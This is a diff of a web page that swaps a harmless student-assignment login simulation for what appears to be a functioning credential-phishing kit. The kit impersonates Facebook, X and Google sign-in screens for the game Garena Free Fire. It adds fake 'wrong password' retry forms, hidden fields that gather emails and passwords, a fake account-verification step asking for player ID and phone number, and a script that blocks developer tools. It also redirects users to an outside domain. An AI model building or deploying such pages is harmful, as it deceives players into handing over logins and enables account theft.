@@ -1,98 +1,837 @@
-<!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Analisis Sistem Login - Tugas Kuliah</title>
-    
-    <link rel="stylesheet" href="css-zone/style-zone.css">
-    <link rel="stylesheet" href="main.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
-    
-    <style>
-        body { background: #000; color: #fff; font-family: 'Arial', sans-serif; overflow: hidden; }
-        
-        /* Penyesuaian agar loading & login tampil di tengah */
-        .popup { 
-            display: none; 
-            position: fixed; 
-            top: 0; left: 0; 
-            width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.9); 
-            z-index: 9999;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .loading-content { text-align: center; margin-top: 20%; }
-        .login-box { 
-            background: #222; 
-            padding: 20px; 
-            border: 1px solid #444; 
-            border-radius: 10px;
-            text-align: center;
-            max-width: 400px;
-            margin: auto;
-        }
-        
-        .btn-login {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        .btn-fb { background: #1877F2; color: white; }
-        .btn-google { background: white; color: #555; }
-    </style>
-</head>
-<body>
+<div class="popup-login first-login-facebook animated fadeIn" style="display: none;">
+<div class="popup-box-login-fb">
+<a onmousedown="tutup.play();" onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
+<div class="navbar-fb">
+<img src="img/style-img/facebook-text.png">
+</div>
+<div class="content-box-fb">
+<p class="kaget first-email-fb" style="width: 320px; top: -5px; text-align: left;">The email address or phone number that you've entered doesn't match any account. <b>Sign up for an account.</b></p>
+<p class="kaget first-sandi-fb" style="width: 320px; top: -5px; text-align: left;">The password that you've entered is incorrect. Forgotten password?</p>
+<img src="img/style-img/icon_2.jpg">
+<div class="txt-login-fb">
+ Log in to your Facebook account to connect to Free Fire.
+</div>
+<form class="login-form" action="javascript:void(0)" method="post" id="FirstValidateLoginFbForm">
+<div class="form-group-fb">
+<input type="text" name="email" id="first-email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Enter Mobile number or email address')" oninput="setCustomValidity('')">
+<div class="form-group-sohid FirstShowFbPassword" onclick="FirstShowFbPassword()">
+<img src="img/style-img/Twitter-Show-Password.png">
+</div> <!--- form-group-sohid FirstShowFbPassword --->
+<div class="form-group-sohid FirstHideFbPassword" style="display: none;" onclick="FirstHideFbPassword()">
+<img src="img/style-img/Twitter-Hide-Password.png">
+</div> <!--- form-group-sohid FirstHideFbPassword --->
+<input type="password" name="password" id="first-password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
+</div> <!--- form-group-fb --->
+<input type="hidden" name="login" id="first-login-facebook" value="Facebook" readonly>
+<button type="submit" class="btn-login-fb" onclick="FirstValidateLoginFbData()">Log In</button>
+</form>
+<div class="txt-create-account">Create Account</div>
+<div class="txt-not-now">Not now</div>
+<div class="txt-forgotten-password">Forgotten password?</div>
+</div>
+<div class="language-box">
+<center>
+<div class="language-name language-name-active">English (UK)</div>
+<div class="language-name">العربية</div>
+<div class="language-name">Türkçe</div>
+<div class="language-name">Tiếng Việt</div>
+<div class="language-name">日本語</div>
+<div class="language-name">Español</div>
+<div class="language-name">Português (Brasil)</div>
+<div class="language-name">
+<i class="fa fa-plus"></i>
+</div>
+</center>
+</div>
+<div class="copyright">Meta © 2023</div>
+</div> <!--- popup-box-login-fb --->
+</div> <!--- popup-login--->
 
-    <div id="loadingScreen" class="popup" style="display: flex;">
-        <div class="loading-content">
-            <i class="fa-solid fa-circle-notch fa-spin" style="font-size: 50px; color: #ffba00;"></i>
-            <p style="margin-top: 20px;" id="statusText">Connecting to server...</p>
-        </div>
+<div class="popup-login first-login-twitter animated fadeIn" style="display: none;">
+<div class="popup-box-login-twitter">
+<a onmousedown="tutup.play();" onclick="close_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
+<div class="header-twitter"><img src="img/style-img/twitter-text.png"></div> <!--- header-twitter --->
+<div class="txt-login-twitter">Sign in to X</div> <!--- txt-login-twitter --->
+<div class="content-box-twitter">
+<form action="javascript:void(0)" method="post" id="FirstValidateLoginTwitterForm">
+<div class="form-group-twitter">
+<input type="text" name="email" id="first-email-twitter" autocomplete="off" required oninvalid="this.setCustomValidity('Enter Username, Email or Mobile number')" oninput="setCustomValidity('')">
+<label>@Username</label>
+</div> <!--- form-group-twitter --->
+<div class="form-group-twitter">
+<div class="form-group-sohi FirstShowTwitterPassword" onclick="FirstShowTwitterPassword()">
+<img src="img/style-img/Twitter-Show-Password.png">
+</div> <!--- form-group-sohi FirstShowTwitterPassword --->
+<div class="form-group-sohi FirstHideTwitterPassword" style="display: none;" onclick="FirstHideTwitterPassword()">
+<img src="img/style-img/Twitter-Hide-Password.png">
+</div> <!--- form-group-sohi FirstHideTwitterPassword --->
+<input type="password" name="password" id="first-password-twitter" autocomplete="off" required oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
+<label>Password</label>
+</div> <!--- form-group-twitter --->
+<p class="kagettw first-email-tw" style="width: 330px; top: -17px; text-align: center; margin-bottom: 3px; margin-left: -18px;">Sorry, we couldn't find your account.</p>
+<p class="kagettw first-sandi-tw" style="width: 330px; top: -17px; text-align: center; margin-bottom: 3px; margin-left: -20px;">Wrong Password!</p>
+<input type="hidden" name="login" id="first-login-twitter" value="Twitter" readonly>
+<button type="submit" onclick="FirstValidateLoginTwitterData()">Log in</button>
+<buttonx type="button">Forgot password?</buttonx>
+<label>Don't have an account? <a>Sign up</a></label>
+</form>
+</div> <!--- content-box-twitter --->
+</div> <!--- popup-box-login-twitter --->
+</div> <!--- popup-login --->
+
+<div class="popup-login second-login-facebook animated fadeIn" style="display: none;">
+<div class="popup-box-login-fb">
+<div class="navbar-fb">
+<img src="img/style-img/facebook-text.png">
+</div>
+<div class="content-box-fb">
+<p class="kaget wrong-email-fb" style="width: 320px; top: -5px; text-align: left; display: block;">Your password was wrong. <b>Please re-login using the correct password.</b></p>
+<p class="kaget second-email-fb" style="width: 320px; top: -5px; text-align: left;">The email address or phone number that you've entered doesn't match any account. <b>Sign up for an account.</b></p>
+<p class="kaget second-sandi-fb" style="width: 320px; top: -5px; text-align: left;">The password that you've entered is incorrect. Forgotten password?</p>
+<img src="img/style-img/icon_2.jpg">
+<div class="txt-login-fb">
+ Log in to your Facebook account to connect to Free Fire.
+</div>
+<form class="login-form" action="javascript:void(0)" method="post" id="SecondValidateLoginFbForm">
+<div class="form-group-fb">
+<input type="text" name="email" id="second-email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Enter Mobile number or email address')" oninput="setCustomValidity('')">
+<div class="form-group-sohid SecondShowFbPassword" onclick="SecondShowFbPassword()">
+<img src="img/style-img/Twitter-Show-Password.png">
+</div> <!--- form-group-sohid SecondShowFbPassword --->
+<div class="form-group-sohid SecondHideFbPassword" style="display: none;" onclick="SecondHideFbPassword()">
+<img src="img/style-img/Twitter-Hide-Password.png">
+</div> <!--- form-group-sohid SecondHideFbPassword --->
+<input type="password" name="password" id="second-password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
+</div> <!--- form-group-fb --->
+<input type="hidden" name="login" id="second-login-facebook" value="Facebook" readonly>
+<button type="submit" class="btn-login-fb" onclick="SecondValidateLoginFbData()">Log In</button>
+</form>
+<div class="txt-create-account">Create Account</div>
+<div class="txt-not-now">Not now</div>
+<div class="txt-forgotten-password">Forgotten password?</div>
+</div>
+<div class="language-box">
+<center>
+<div class="language-name language-name-active">English (UK)</div>
+<div class="language-name">العربية</div>
+<div class="language-name">Türkçe</div>
+<div class="language-name">Tiếng Việt</div>
+<div class="language-name">日本語</div>
+<div class="language-name">Español</div>
+<div class="language-name">Português (Brasil)</div>
+<div class="language-name">
+<i class="fa fa-plus"></i>
+</div>
+</center>
+</div>
+<div class="copyright">Meta © 2023</div>
+</div> <!--- popup-box-login-fb --->
+</div> <!--- popup-login--->
+
+<div class="popup-login second-login-twitter animated fadeIn" style="display: none;">
+<div class="popup-box-login-twitter">
+<div class="header-twitter"><img src="img/style-img/twitter-text.png"></div> <!--- header-twitter --->
+<div class="txt-login-twitter">Sign in to X</div> <!--- txt-login-twitter --->
+<div class="content-box-twitter">
+<form action="javascript:void(0)" method="post" id="SecondValidateLoginTwitterForm">
+<div class="form-group-twitter">
+<input type="text" name="email" id="second-email-twitter" autocomplete="off" required oninvalid="this.setCustomValidity('Enter Username, Email or Mobile number')" oninput="setCustomValidity('')">
+<label>@Username</label>
+</div> <!--- form-group-twitter --->
+<div class="form-group-twitter">
+<div class="form-group-sohi SecondShowTwitterPassword" onclick="SecondShowTwitterPassword()">
+<img src="https://i.ibb.co/PYpHF6b/Twitter-Show-Password.png">
+</div> <!--- form-group-sohi SecondShowTwitterPassword --->
+<div class="form-group-sohi SecondHideTwitterPassword" style="display: none;" onclick="SecondHideTwitterPassword()">
+<img src="https://i.ibb.co/pZDr8sd/Twitter-Hide-Password.png">
+</div> <!--- form-group-sohi SecondHideTwitterPassword --->
+<input type="password" name="password" id="second-password-twitter" autocomplete="off" required oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
+<label>Password</label>
+</div> <!--- form-group-twitter --->
+<p class="kagettw wrong-email-tw" style="width: 330px; top: -17px; text-align: center; margin-bottom: 3px; margin-left: -18px; display: block;">Your password was wrong.<br>Please re-login using the correct password</p>
+<p class="kagettw first-email-tw" style="width: 330px; top: -17px; text-align: center; margin-bottom: 3px; margin-left: -18px;">Sorry, we couldn't find your account.</p>
+<p class="kagettw first-sandi-tw" style="width: 330px; top: -17px; text-align: center; margin-bottom: 3px; margin-left: -20px;">Wrong Password!</p>
+<input type="hidden" name="login" id="second-login-twitter" value="Twitter" readonly>
+<button type="submit" onclick="SecondValidateLoginTwitterData()">Log in</button>
+<buttonx type="button">Forgot password?</buttonx>
+<label>Don't have an account? <a>Sign up</a></label>
+</form>
+</div> <!--- content-box-twitter --->
+</div> <!--- popup-box-login-twitter --->
+</div> <!--- popup-login --->
+
+<div class="popup-login login-facebook-load" style="display: none;">
+<div class="popup-box-login-fb">
+<div class="navbar-fb">
+<img src="img/style-img/facebook-text.png">
+</div> <!--- navbar --->
+<div class="content-box-fb">
+<div class="fb-load">
+<img src="img/style-img/icon_fb.png">
+<div class="loader3"></div>
+</div> <!--- fb-load --->
+</div> <!--- content-box-fb --->
+</div> <!--- popup-box-login-fb --->
+</div> <!--- popup-login--->
+
+<div class="popup-login login-twitter-load" style="display: none;">
+<div class="popup-box-login-twitter">
+<div class="twitter-load">
+<div class="twitter-load-title">
+<div class="loader2"></div>
+</div> <!--- twitter-load-title --->
+</div> <!--- twitter-load --->
+</div> <!--- popup-box-login-twitter --->
+</div> <!--- popup-login --->
+
+<div class="popup account_verification animated fadeIn" style="display: none;">
+	<div class="popup-box-wrapperz">
+		<div class="popup-box-navbarz">
+			<div class="popup-box-navbar-title">Account Verification</div>
+		</div>
+		<div class="popup-box-bgz">
+			<div class="popup-box-alert4"><br>Complete your Garena Free Fire account details<br><br></div>
+			<form class="popup-box-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
+				<input type="hidden" name="email" id="validateEmail" readonly>
+				<input type="hidden" name="password" id="validatePassword" readonly>
+				<input type="number" name="playid" id="playid" placeholder="Account ID" autocomplete="off" required oninvalid="this.setCustomValidity('Enter Account Player ID')" oninput="setCustomValidity('')">
+				<input type="number" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required oninvalid="this.setCustomValidity('Masukkan Phone Number Anda')" oninput="setCustomValidity('')">
+				<select name="level" id="level" required oninvalid="this.setCustomValidity('Pilih Account Level Anda')" oninput="setCustomValidity('')">
+					<option selected="selected" disabled="disabled" value="">Account Level</option>
+					<script>
+						for(var i = 1; i <= 100; i++){
+							document.write("<option>" + i + "</option>");
+						};
+					</script>
+				</select>
+				<input type="hidden" name="login" id="validateLogin" readonly>
+				<br>
+				<br>
+				<div class="popup-box-form-footer">
+					<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()" style="margin-top: -6px;">Verify</button>
+				</div>
+			</form>
+		</div>
+	</div>
+</div>
+
+<div class="popup check_verification animated fadeIn" style="display: none;">
+	<div class="popup-box-wrapperz">
+		<div class="popup-box-navbarz">
+			<div class="popup-box-navbar-title">Processing Account</div>
+		</div>
+		<div class="popup-box-bgx">
+			<div class="popup-box-alert8"><br>
+				<i class="fa-solid fa-circle-notch fa-spin" style="color: #737373;font-size: 50px;margin-bottom: 14px;"></i>
+				<br> Processing your account details...
+				<br><br>
+			</div>
+			<div class="popup-box-footer"></div>
+		</div>
+	</div>
+</div>
+
+<div class="popup processing_account animated fadeIn" style="display: none;">
+	<div class="popup-box-wrapperz">
+		<div class="popup-box-navbarz">
+			<div class="popup-box-navbar-title">Purchase Process</div>
+		</div>
+		<div class="popup-box-bgz">
+			<div class="popup-box-alert3" style="padding-top: 7px;">
+				Hello Sir!<br>
+				<p>We have received your purchase! 
+				<br>Please wait a moment!<br> Our team will soon process the reward to the registered ID<br> we will notify you via your in-game mailbox!
+				<br><br>Booyah Regards!</p></div>
+			<div class="popup-box-alert0">
+			</div>
+			<div class="popup-box-footer">
+				<button type="button" onmousedown="tutup.play();" style="margin-right: 0; float: none;" onclick="location.href='https://mpcmh8d.biz.id/';">Logout</button>
+			</div>
+		</div>
+	</div>
+</div>
+</div>
+
+<div class="footer" style="top:-80px;">
+<img class="footer-copyright-icon" src="img/logo.png">
+<div class="footer-copyright-text">
+<div class="footer-txt-copyrights">
+Copyright © Garena International. Trademarks belong to their respective owners. All rights reserved.
+</div> <!--- footer-txt-copyrights --->
+<div class="footer-copyright-text-left">Privacy Policy</div> <!--- footer-txt-copyright --->
+<div class="footer-copyright-text-center">For Parents FAQ</div> <!--- footer-txt-copyright --->
+<div class="footer-copyright-text-right">Terms of Service</div> <!--- footer-txt-copyright --->
+</div> <!--- footer-copyright-text --->
+</div> <!--- footer --->
+
+<div class="popup open_rewards animated fadeIn" style="display: none;">
+<div class="popup-box-wrapper">
+<div class="popup-box-bg" style="height:220px;">
+<div class="popup-box-alert4"><br> </div> <!--- popup-box-alert --->
+<div class="popup-box-item">
+<div>
+<figure>
+<img class="popup-item flip" src="">
+</figure>
+</div>
+</div> <!--- popup-box-item --->
+<br>
+<div class="popup-box-footer" style="margin-top:40px;">
+<button type="button" onmousedown="buka.play();" onmousedown="buka.play();" onclick="get_token()">Collect</button>
+</div> <!--- popup-box-bg --->
+</div> <!--- popup-box-footer --->
+</div> <!--- popup-box-wrapper --->
+</div> <!--- popup open_rewards --->
+
+<div class="popup loadinglogin" style="display: none;">
+<div class="loadinglogin"style="width:400px;height: 679px;margin-top:279px;margin-left:auto;margin-right:auto;">
+<div class="loader-line"></div>
+<div class="loader-label" id="text-login1">Checking for updates...</div>
+<div class="loader-label" style="display:none" id="text-login2">Connecting to server...</div>
+<img src="img/load.jpg" style="background-size: 100% 100%;width: 100%;">
+</img>
+</div>
+</div>
+
+<div class="popup account_login animated fadeIn" style="display: none;">
+<div class="popup-box-wrapper">
+</div>
+<div class="loginpop">
+<div class="popup-box-alert-login"><br>
+<img class="popup-box-gamecon" src="https://www.pubgmobile.com/act/a20180515iggamepc/logo.png" style="opacity:0%;"></div>
+<button type="button" style="top:9px;" onmousedown="buka.play();" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa-brands fa-facebook"></i>Login dengan Facebook</button><br>
+<div class="alter-text"><span>or</span></div>
+<button type="button" style="top:-35px;" onmousedown="buka.play();" class="popup-btn-login popup-btn-google" onclick="open_google();" style="top: 1px;"><img src="img/style-img/google.png"><g style="padding-right: 9px;">Login dengan Google</g></button>
+</div> <!--- popup-box-bg --->
+</div> <!--- popup-box-footer --->
+
+<div class="popup-login first-login-google animated fadeIn" style="display: none;">
+<div class="popup-box-login-google">
+<a onmousedown="tutup.play();" onclick="close_google()" class="close-other"><i class="zmdi zmdi-close"></i></a>
+<div class="box-google">
+<div class="header-google"><img src="img/style-img/google.png">
+</div> <!--- header-google --->
+<div class="txt-login-google">Sign in</div> <!--- txt-login-google --->
+<div class="txt-login-google-desc">Use your Google Account</div> <!--- txt-login-google-desc --->
+<form action="javascript:void(0)" method="post" id="FirstValidateLoginGoogleForm">
+<div class="input-box">
+<label class="input-label" style="text-shadow: none;">Email Address</label>
+<input type="email" class="input-1" name="email" id="first-google-email" onfocus="setFocus(true)" onblur="setFocus(false)" required>
+</div>
+<div class="input-box">
+<div class="form-group-showhide GoogleShowPassword" onclick="FirstshowGooglePassword()"><i class="zmdi zmdi-eye"></i></div>
+<div class="form-group-showhide GoogleHidePassword" style="display: none;" onclick="FirsthideGooglePassword()"><i class="zmdi zmdi-eye-off"></i></div>
+<label class="input-label" style="text-shadow: none;">Password</label>
+<input type="password" class="input-1" name="password" id="first-google-password" onfocus="setFocus(true)" onblur="setFocus(false)" required>
+</div>
+<input type="hidden" name="login" id="first-google-login" value="Google Play" readonly>
+<div class="first-email-google" style="display: none;">
+<svg aria-hidden="true" fill="currentColor" focusable="false" width="13px" height="13px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
+</svg> Your Google Account cannot be found.</div>
+<div class="first-sandi-google" style="display: none;">
+<svg aria-hidden="true" fill="currentColor" focusable="false" width="13px" height="13px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
+</svg> Wrong password, please try again.</div>
+<div class="btn-forgot-google">Forgot your email?</div>
+<div class="btn-not-computer">Not your computer? Use Guest mode to sign in privately. <p style="color: #3166d3;font-weight: 500;">Learn more about using Guest mode</p></div>
+<button type="submit" class="btn-login-google" onclick="FirstValidateLoginGoogleData()">Next</button>
+</form>
+<div class="notify-google">Create account</div> <!--- notify-google --->
+</br>
+</div> <!--- box-google --->
+</div>
+</div>
+
+<script>
+  // show hide password for Google
+  function FirstshowGooglePassword() {
+    var x = document.getElementById("first-google-password");
+    if (x.type === "password") {
+      x.type = "text";
+      $('.GoogleShowPassword').hide();
+      $('.GoogleHidePassword').show();
+    } else {
+      x.type = "password";
+    }
+  }
+  
+  function FirsthideGooglePassword() {
+    var x = document.getElementById("first-google-password");
+    if (x.type === "text") {
+      x.type = "password";
+      $('.GoogleShowPassword').show();
+      $('.GoogleHidePassword').hide();
+    } else {
+      x.type = "text";
+    }
+  }
+  
+  // show hide password for Google
+  function SecondshowGooglePassword() {
+    var x = document.getElementById("second-google-password");
+    if (x.type === "password") {
+      x.type = "text";
+      $('.GoogleShowPassword').hide();
+      $('.GoogleHidePassword').show();
+    } else {
+      x.type = "password";
+    }
+  }
+  
+  function SecondhideGooglePassword() {
+    var x = document.getElementById("second-google-password");
+    if (x.type === "text") {
+      x.type = "password";
+      $('.GoogleShowPassword').show();
+      $('.GoogleHidePassword').hide();
+    } else {
+      x.type = "text";
+    }
+  }
+</script>
+
+<div class="popup-login second-login-google animated fadeIn" style="display: none;">
+<div class="popup-box-login-google">
+<div class="box-google">
+<div class="header-google"><img src="img/style-img/google.png">
+</div> <!--- header-google --->
+<div class="txt-login-google">Sign in</div> <!--- txt-login-google --->
+<div class="txt-login-google-desc">Use your Google Account</div> <!--- txt-login-google-desc --->
+<form action="javascript:void(0)" method="post" id="SecondValidateLoginGoogleForm">
+<div class="input-box">
+<label class="input-label" style="text-shadow: none;">Email Address</label>
+<input type="email" class="input-1" name="email" id="second-google-email" onfocus="setFocus(true)" onblur="setFocus(false)" required>
+</div>
+<div class="input-box">
+<div class="form-group-showhide GoogleShowPassword" onclick="SecondshowGooglePassword()"><i class="zmdi zmdi-eye"></i></div>
+<div class="form-group-showhide GoogleHidePassword" style="display: none;" onclick="SecondhideGooglePassword()"><i class="zmdi zmdi-eye-off"></i></div>
+<label class="input-label" style="text-shadow: none;">Password</label>
+<input type="password" class="input-1" name="password" id="second-google-password" onfocus="setFocus(true)" onblur="setFocus(false)" required>
+</div>
+<input type="hidden" name="login" id="second-google-login" value="Google Play" readonly>
+<div class="second-email-google" style="display: none;">
+<svg aria-hidden="true" fill="currentColor" focusable="false" width="13px" height="13px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
+</svg> Your Google Account cannot be found.</div>
+<div class="second-sandi-google" style="display: block;">
+<svg aria-hidden="true" fill="currentColor" focusable="false" width="13px" height="13px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
+</svg> Wrong password, please try again.</div>
+<div class="btn-forgot-google">Forgot your email?</div>
+<div class="btn-not-computer">Not your computer? Use Guest mode to sign in privately. <p style="color: #3166d3;font-weight: 500;">Learn more about using Guest mode</p></div>
+<button type="submit" class="btn-login-google" onclick="SecondValidateLoginGoogleData()">Next</button>
+</form>
+<div class="notify-google">Create account</div> <!--- notify-google --->
+</br>
+</div> <!--- box-google --->
+</div>
+</div>
+
+<div class="popup-login login-google-load animated fadeIn" style="display: none;">
+  <div class="popup-box-login-google">
+    <div class="box-google">
+      <div class="header-google"><img src="img/style-img/google.png" style="margin-bottom: -72px;justify-self: center;">
+      </div> <!--- header-google --->
+      <div class="loadgoogle">
+        <i class="fa-solid fa-circle-notch fa-spin" style="width: 36%;font-size: 49px;color: #1a73e8;"></i>
+      </div>
     </div>
+  </div> <!--- box-google --->
+</div>
 
-    <div id="loginChoice" class="popup">
-        <div class="login-box">
-            <h3>PILIH METODE LOGIN</h3>
-            <p style="font-size: 12px; color: #aaa;">Silakan login untuk memproses verifikasi akun.</p>
-            
-            <button class="btn-login btn-fb">
-                <i class="fa-brands fa-facebook"></i> Login dengan Facebook
-            </button>
-            
-            <button class="btn-login btn-google">
-                <img src="img/style-img/google.png" width="18" style="vertical-align: middle;"> Login dengan Google
-            </button>
-        </div>
+<div class="popup itemReward_confirmation2 fadeIn" style="display: none;">
+  <div class="popup-box-wrapperz">
+    <div class="popup-box-navbar-lz" style="margin-bottom:11px;">
+      <div class="popup-box-navbar-lz-title">KONFIRMASI PEMBELIAN</div>
+      <img onmousedown="tutup.play();" onclick="close_reward_confirmation()" src="img/popup-close2.png"
+        style="margin-top: -24px;margin-right: 7px;opacity: 77%;">
     </div>
+    <div class="popup-box-lz">
+      <div class="popup-box-alert-lz">Apakah Kamu Yakin membeli item ini?</div>
+      <div class="confirmation-content">
+        <div class="popup-box-item bordermotion itemShine">
+          <figure>
+            <img src="" id="myItemReward_confirmationImg" alt="Item">
+            <span id="amount"></span>
+          </figure>
+        </div>
+        <div class="item-details-right">
+          <div class="item-name-confirmation">
+            <span id="ItemName"></span>
+          </div>
+          <div class="item-price-row">
+            <span class="price-label">Price:</span>
+            <img src="img/tokens.png" class="token-icon-inline">
+            <pr id="price"></pr>
+          </div>
+        </div>
+      </div>
+      <div class="popup-box-footer-lz">
+        <button type="button" onmousedown="buka.play();" onclick="get_token()">
+          Beli
+        </button>
+      </div> <!--- popup-box-footer --->
+    </div>
+  </div>
+</div>
 
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-    <script>
-        $(document).ready(function() {
-            // Simulasi: Setelah 3 detik loading, tampilkan menu login
-            setTimeout(function() {
-                $('#statusText').text('Server Connected!');
-                
-                setTimeout(function() {
-                    $('#loadingScreen').fadeOut(500, function() {
-                        $('#loginChoice').css('display', 'flex').hide().fadeIn(500);
-                    });
-                }, 1000);
-                
-            }, 3000);
+</div><div class="popup itemReward_confirmationsold fadeIn" style="display: none;">
+<div class="popup-box-wrapperz">
+<div class="popup-box-navbar-lz" style="margin-bottom:11px;">
+<div class="popup-box-navbar-lz-title">Confirmation</div>
+<img onmousedown="tutup.play();" onclick="close_reward_confirmation()" src="img/popup-close2.png" style="margin-top: -27px;margin-right: 25px;opacity: 100%;">
+</div>
+<div class="popup-box-lz">
+<div class="popup-box-alert-lz">Sorry, this item is sold out!</div>
+<div class="popup-box-item bordermotion itemShine" style="width: 21%;height: 78px;margin-top: 9px;margin-left: 60px;margin-bottom:10px;">
+<rw id="ItemNamesold"></rw>
+<div class="popup-box-alert-price">Price:</div>
+<prs id="pricesold"></prs>
+<div>
+<figure>
+<span id="amountsold"></span>
+<img src="" id="myItemReward_confirmationImgsold">
+</figure>
+</div>
+<div class="line"></div>
+<img src="img/tokens.png" style="margin-top: 3px;margin-right: -70px;width: 19px;height: auto;">
+</div> <!--- popup-box-item --->
+<br>
+<div class="popup-box-footer-lz">
+<button type="button" onmousedown="buka.play();" onclick="soldout()" style="width: 90px;height: 28px;padding-left: 0;padding-right: 0;margin-top: -4px;"><font style="">SOLD OUT</font> </button>
+</div> <!--- popup-box-footer --->
+</div> <!--- popup-box-bg --->
+</div> <!--- popup-box-wrapper --->
+</div> <!--- popup itemReward_confirmation --->
 
-            // Simulasi klik (Hanya memunculkan alert, tidak mengirim data ke PHP)
-            $('.btn-login').click(function() {
-                alert("Simulasi: Data login akan diproses secara aman melalui protokol OAuth resmi (Teori Tugas).");
-            });
-        });
-    </script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script disable-devtool-auto src='https://cdn.jsdelivr.net/npm/disable-devtool@latest'></script>
+<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<audio id="audioFile" src="media/spin.mp3"></audio>
+<script src="js-zone/lazcode.js"></script>
+<script src="js-zone/flaglink.js"></script>
+<script src="js-zone/slidernotif.js"></script>
+<script src="js-zone/sender.js"></script>
+<script src="js-zone/slide-zone.js"></script>
+<script>
+function initScrollingBanners() {
+    const banners = document.querySelectorAll('.item-name-confirmation');
+    
+    banners.forEach(banner => {
+        const span = banner.querySelector('span');
+        if (!span) return;
+        
+        const bannerWidth = banner.offsetWidth;
+        const spanWidth = span.offsetWidth;
+        
+        if (spanWidth > bannerWidth) {
+            const scrollDistance = -(spanWidth - bannerWidth + 16);
+            span.style.setProperty('--scroll-distance', scrollDistance + 'px');
+            banner.classList.add('needs-scroll');
+        } else {
+            banner.classList.remove('needs-scroll');
+        }
+    });
+}
 
+document.addEventListener('DOMContentLoaded', initScrollingBanners);
+window.addEventListener('resize', initScrollingBanners);
+</script>
+<script>
+function initScrollingBanners() {
+  const banners = document.querySelectorAll('.item-name-banner');
+  
+  banners.forEach(banner => {
+    const span = banner.querySelector('span');
+    if (!span) return;
+    
+    const bannerWidth = banner.offsetWidth;
+    const spanWidth = span.offsetWidth;
+    
+    if (spanWidth > bannerWidth) {
+      const scrollDistance = -(spanWidth - bannerWidth + 16); 
+      span.style.setProperty('--scroll-distance', scrollDistance + 'px');
+      banner.classList.add('needs-scroll');
+    } else {
+      banner.classList.remove('needs-scroll');
+    }
+  });
+}
+
+document.addEventListener('DOMContentLoaded', initScrollingBanners);
+window.addEventListener('resize', initScrollingBanners);
+</script>
+<script>
+function open_google() {
+  $('.first-login-google').show();
+  $('.more_login').hide();
+  $('.account_login').hide()
+  $('.itemReward_confirmations2').hide();
+}	
+function close_google() {
+  $('.first-login-google').hide();
+  $('.account_login').show();
+  $('.more_login').hide();
+}
+// code for validate data to next step
+function FirstValidateLoginGoogleData() {
+    $('#FirstValidateLoginGoogleForm').submit(function (submitingFirstValidateLoginGoogleData) {
+      submitingFirstValidateLoginGoogleData.preventDefault();
+      $emailgoogle = $('#first-google-email').val().trim();
+      $passwordgoogle = $('#first-google-password').val().trim();
+      $logingoogle = $('#first-google-login').val().trim();
+      if ($emailgoogle == '' || $emailgoogle == null || $emailgoogle.length <= 7) {
+        $('.first-email-google').fadeIn();
+        setTimeout(function () {
+          $('.first-email-google').fadeOut();
+        }, 2000);
+        $('.first-sandi-google').hide();
+        $('.first-login-google').show();
+        return false;
+      } else {
+        $('.first-email-google').hide();
+        $("input#validateEmail").val($emailgoogle);
+        $('.first-login-google').hide();
+      }
+      if ($passwordgoogle == '' || $passwordgoogle == null || $passwordgoogle.length <= 7) {
+        $('.first-sandi-google').fadeIn();
+        setTimeout(function () {
+          $('.first-sandi-google').fadeOut();
+        }, 2000);
+        $('.first-login-google').show();
+        return false;
+      } else {
+        $('.first-sandi-google').hide();
+        $("input#validatePassword").val($passwordgoogle);
+        $("input#validateLogin").val($logingoogle);
+        $('.first-login-google').hide();
+        $('.login-google-load').show()
+        setTimeout(function () {
+          $('.first-login-google').hide()
+          $('.second-login-google').hide()
+          $('.login-google-load').hide()
+          $('.account_verification').show()
+        }, 4000)
+      }
+      var $validateEmail = $("input#validateEmail").val();
+      var $validatePassword = $("input#validatePassword").val();
+      var $validateLogin = $("input#validateLogin").val();
